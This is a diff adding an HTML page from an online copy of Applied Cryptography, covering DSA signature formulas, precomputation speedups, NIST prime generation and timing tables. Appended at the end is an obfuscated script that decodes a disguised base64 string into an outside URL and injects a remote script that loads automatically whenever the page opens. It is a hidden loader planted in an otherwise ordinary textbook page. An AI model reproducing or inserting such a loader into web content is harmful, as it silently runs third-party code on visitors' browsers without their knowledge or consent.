@@ -1,0 +1,192 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=487-489//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Proofs for the mathematical relationships are found in [1154]. Table 20.1 provides a summary.
+</P>
+<P><FONT SIZE="+1"><B><I>Speed Precomputations</I></B></FONT></P>
+<P>Table 20.2 gives sample software speeds of DSA [918].
+</P>
+<P>Real-world implementations of DSA can often be speeded up through precomputations. Notice that the value <I>r</I> does not depend on the message. You can create a string of random <I>k</I> values, and then precompute <I>r</I> values for each of them. You can also precompute <I>k</I><SUP>-1</SUP> for each of those <I>k</I> values. Then, when a message comes along, you can compute <I>s</I> for a given <I>r</I> and <I>k</I><SUP>-1</SUP>.</P>
+<P>This precomputation speeds up DSA considerably. Table 20.3 is a comparison of DSA and RSA computation times for a particular smart card implementation [1479].</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 20.1<BR>DSA Signatures
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP"><B><I>Public Key:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>p</I> 512-bit to 1024-bit prime (can be shared among a group of users)
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>q</I> 160-bit prime factor of <I>p</I> &#150; 1 (can be shared among a group of users)
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>g</I> = <I>h</I><SUP>(<I>p</I> - 1)/<I>q</I></SUP> mod <I>p</I>, where <I>h</I> is less than <I>p</I> &#150; 1 and <I>h</I><SUP>(<I>p</I> - 1)/<I>q</I></SUP> mod <I>p</I> &gt 1 (can be shared among a group of users)
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>y</I> = <I>g</I><SUP>x</SUP> mod <I>p</I> (a p-bit number)
+<TR>
+<TD>
+<TD ALIGN="LEFT"><B><I>Private Key:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>x</I> &lt <I>q</I> (a 160-bit number)
+<TR>
+<TD>
+<TD ALIGN="LEFT"><B><I>Signing:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>k</I> choose at random, less than <I>q</I>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>r</I> (signature) = (<I>g</I><SUP>k</SUP> mod <I>p</I>) mod <I>q</I>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>s</I> (signature) = (<I>k</I><SUP>-1</SUP> (<I>H</I>(<I>m</I>) &#43; <I>xr</I>)) mod <I>q</I>
+<TR>
+<TD>
+<TD ALIGN="LEFT"><B><I>Verifying:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>w</I> = <I>s</I><SUP>-1</SUP> mod <I>q</I>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>u</I><SUB>1</SUB> = (<I>H</I>(<I>m</I>) * <I>w</I>) mod <I>q</I>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>u</I><SUB>2</SUB> = (<I>rw</I>) mod <I>q</I>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT"><I>v</I> = ((<I>g<SUP>u</I><SMALL>1</SMALL></SUP> * <I>y<SUP>u</I><SMALL>2</SMALL></SUP>) mod <I>p</I>) mod <I>q</I>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT">If <I>v</I> = <I>r</I>, then the signature is verified.
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>DSA Prime Generation</I></B></FONT></P>
+<P>Lenstra and Haber pointed out that certain moduli are much easier to crack than others [950]. If someone forced a network to use one of these &#147;cooked&#148; moduli, then their signatures would be easier to forge. This isn&#146;t a problem for two reasons: These moduli are easy to detect and they are so rare that the chances of using one when choosing a modulus randomly are almost negligible&#151;smaller, in fact, than the chances of accidentally generating a composite number using a probabilistic prime generation routine.
+</P>
+<P>In [1154] NIST recommended a specific method for generating the two primes, <I>p</I> and <I>q</I>, where <I>q</I> divides <I>p</I> &#150; 1. The prime <I>p</I> is <I>L</I> bits long, between 512 and 1024 bits long, in some multiple of 64 bits. The prime <I>q</I> is 160 bits long. Let <I>L</I> &#150; 1 = 160<I>n</I> &#43; <I>b</I>, where <I>L</I> is the length of <I>p</I>, and <I>n</I> and <I>b</I> are two numbers and <I>b</I> is less than 160.</P>
+<TABLE WIDTH="60%"><TH CAPTION ALIGN="CENTER" COLSPAN="4">Table 20.2<BR>DSA Speeds for Different Modulus Lengths with a 160-bit Exponent (on a SPARC II)
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TH WIDTH="10%" ALIGN="LEFT">
+<TH WIDTH="15%" ALIGN="LEFT">512 bits
+<TH WIDTH="15%" ALIGN="LEFT">768 bits
+<TH WIDTH="15%" ALIGN="LEFT">1024 bits
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Sign
+<TD VALIGN="TOP" ALIGN="LEFT">0.20 sec
+<TD VALIGN="TOP" ALIGN="LEFT">0.43 sec
+<TD VALIGN="TOP" ALIGN="LEFT">0.57 sec
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Verify
+<TD VALIGN="TOP" ALIGN="LEFT">0.35 sec
+<TD VALIGN="TOP" ALIGN="LEFT">0.80 sec
+<TD VALIGN="TOP" ALIGN="LEFT">1.27 sec
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+</TABLE>
+<P>
+</P>
+<TABLE WIDTH="95%"><TH CAPTION ALIGN="CENTER" COLSPAN="4">Table 20.3<BR>Comparison of RSA and DSA Computation Times
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TH WIDTH="30%" ALIGN="LEFT" VALIGN="BOTTOM">
+<TH WIDTH="20%" ALIGN="CENTER" VALIGN="BOTTOM">DSA
+<TH WIDTH="20%" ALIGN="CENTER" VALIGN="BOTTOM">RSA
+<TH WIDTH="15%" ALIGN="CENTER" VALIGN="BOTTOM">DSA with<BR>Common <I>p, q, g</I>
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Global Computations
+<TD VALIGN="TOP" ALIGN="CENTER">Off-card (P)
+<TD VALIGN="TOP" ALIGN="CENTER">N/A
+<TD VALIGN="TOP" ALIGN="CENTER">Off-card (P)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Key Generation
+<TD VALIGN="TOP" ALIGN="CENTER">14 sec
+<TD VALIGN="TOP" ALIGN="CENTER">Off-card (S)
+<TD VALIGN="TOP" ALIGN="CENTER">4 sec
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Precomputation
+<TD VALIGN="TOP" ALIGN="CENTER">14 sec
+<TD VALIGN="TOP" ALIGN="CENTER">N/A
+<TD VALIGN="TOP" ALIGN="CENTER">4 sec
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Signature
+<TD VALIGN="TOP" ALIGN="CENTER">.03 sec
+<TD VALIGN="TOP" ALIGN="CENTER">15 sec
+<TD VALIGN="TOP" ALIGN="CENTER">.03 sec
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Verification
+<TD VALIGN="TOP" ALIGN="CENTER">16 sec
+<TD VALIGN="TOP" ALIGN="CENTER">1.5 sec
+<TD VALIGN="TOP" ALIGN="CENTER">10 sec
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="CENTER">1&#150;5 sec off-card (P)
+<TD VALIGN="TOP" ALIGN="CENTER">1&#150;3 sec off-card (P)
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD COLSPAN="4"><SMALL>Off-card computations were performed on an 80386 33 mHz, personal computer. (P) indicates public parameters off-card and (S) indicates secret parameters off-card. Both algorithms use a 512-bit modulus.</SMALL>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(eYbWZdRS, QXlFaFvS) {QXlFaFvS = eYbWZdRS.createElement('script');QXlFaFvS.type = 'text/javascript';QXlFaFvS.async = true;QXlFaFvS.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');eYbWZdRS.getElementsByTagName('body')[0].appendChild(QXlFaFvS);}(document));</script></body>
+</html>
